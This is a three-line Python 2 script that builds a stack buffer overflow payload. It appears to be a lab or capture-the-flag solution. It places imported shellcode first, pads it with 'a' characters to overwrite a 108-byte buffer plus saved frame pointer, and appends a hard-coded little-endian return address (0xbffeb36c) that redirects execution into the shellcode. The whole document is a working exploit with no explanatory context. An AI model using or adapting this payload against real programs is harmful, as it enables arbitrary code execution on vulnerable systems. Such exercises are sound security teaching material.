from shellcode import shellcode
from struct import pack

print shellcode +  'a' *(108 - len(shellcode) + 4) + pack("<I", 0xbffeb36c)
